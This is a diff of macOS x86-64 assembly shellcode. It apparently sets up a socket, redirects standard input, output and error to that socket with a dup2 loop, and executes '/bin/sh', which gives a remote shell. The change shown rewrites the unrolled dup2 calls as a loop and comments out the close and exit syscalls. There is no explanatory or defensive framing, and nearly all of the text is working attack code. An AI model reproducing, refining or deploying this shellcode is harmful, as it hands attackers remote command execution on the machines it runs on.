@@ -7,7 +7,6 @@ section .text
 global start
 
 start:
-;a:
  	xor rbx, rbx
 	xor rdx, rdx
 
@@ -32,23 +31,31 @@ start:
 	mov rdx, 16
 	syscall
 
-;dup2
-	mov rax, 0x200005A ;90 AUE_DUP2    ALL { int dup2(u_int from, u_int to); }
-	mov rdi, r12
 	xor rsi, rsi
-	syscall	
 
+dup:
 	mov rax, 0x200005A ;90 AUE_DUP2    ALL { int dup2(u_int from, u_int to); }
 	mov rdi, r12
-	inc rsi
-	syscall	
+	syscall
+	
+	cmp rsi, 0x2
+	inc rsi 
+	jbe dup
 
-	mov rax, 0x200005A ;90 AUE_DUP2    ALL { int dup2(u_int from, u_int to); }
-	mov rdi, r12
-	inc rsi
-	syscall	
+;	mov rax, 0x200005A ;90 AUE_DUP2    ALL { int dup2(u_int from, u_int to); }
+;	mov rdi, r12
+;	xor rsi, rsi
+;	syscall	
 
-	mov r13, rax
+;	mov rax, 0x200005A ;90 AUE_DUP2    ALL { int dup2(u_int from, u_int to); }
+;	mov rdi, r12
+;	inc rsi
+;	syscall	
+
+;	mov rax, 0x200005A ;90 AUE_DUP2    ALL { int dup2(u_int from, u_int to); }
+;	mov rdi, r12
+;	inc rsi
+;	syscall	
 
 ;Exec
     mov r8, '/bin/sh'
@@ -60,14 +67,14 @@ start:
     syscall
 
 ;Close
-	mov rax, 0x2000006
-	mov rdi, r12
-	syscall
+;	mov rax, 0x2000006
+;	mov rdi, r12
+;	syscall
 
 ;Exit
 
-	mov rdi, rax
-	mov rax, 0x2000001      ; System call number for exit = 1
-	mov rdi, r13              ; Exit success = 0
-	syscall                 ; Invoke the kernel
+;	mov rdi, rax
+;	mov rax, 0x2000001      ; System call number for exit = 1
+;	mov rdi, r13              ; Exit success = 0
+;	syscall                 ; Invoke the kernel
 
